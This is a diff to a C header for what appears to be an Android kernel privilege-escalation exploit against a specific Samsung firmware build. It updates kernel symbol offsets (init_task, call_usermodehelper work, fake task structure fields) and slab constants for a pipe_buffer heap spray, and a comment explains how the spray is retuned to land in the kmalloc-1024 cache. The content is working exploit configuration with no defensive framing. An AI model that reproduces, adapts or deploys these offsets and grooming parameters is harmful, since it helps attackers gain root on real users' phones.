@@ -124,7 +124,7 @@
 #define ASHMEM_SHOW_FDINFO_OFF 0x00d3b078ULL
 #define ANON_PIPE_BUF_OPS_OFF 0x01219d90ULL
 #define ASHMEM_FOPS_OFF 0x013d1140ULL
-#define KMALLOC_CACHES_OFF 0x0176c6f8ULL
+#define KMALLOC_CACHES_OFF 0x0176cbb8ULL
 #define SYSTEM_UNBOUND_WQ_OFF 0x0223ae60ULL
 #define INIT_TASK_OFF 0x0224f8c0ULL
 #define ROOT_TASK_GROUP_OFF 0x0244cd80ULL
@@ -154,7 +154,7 @@
   (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
 #define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
 
-#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x016a622aULL
+#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x016a6574ULL
 #define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x02242a20ULL
 #define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
 #define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x023762f0ULL
@@ -261,7 +261,14 @@
 #define FAKE_TASK_PI_TOP_TASK_OFF TASK_PI_TOP_TASK_OFF
 #define FAKE_TASK_PI_BLOCKED_ON_OFF TASK_PI_BLOCKED_ON_OFF
 
-#define PIPE_BUFFER_SLOTS 16
+/* Samsung S921USQS6DZF2 kernel caps F_SETPIPE_SZ at 16 slots for untrusted
+ * apps. 16 * sizeof(pipe_buffer)=40 = 640 bytes → kmalloc-1024 (index 10),
+ * not kmalloc-2048 (index 11). Override the cache index so the pipe slab
+ * gate matches where the reclaim pipes actually land. PIPE_BUFFER_SLOTS stays
+ * at 32 for the shape/drain logic; the actual resize cap is enforced by
+ * resize_pipe_slots() falling back gracefully. */
+#define PIPE_BUFFER_SLOTS 32
+#define KMALLOC_PIPE_INDEX 10
 #define PIPE_BUF_FLAG_CAN_MERGE 0x10
 
 #endif
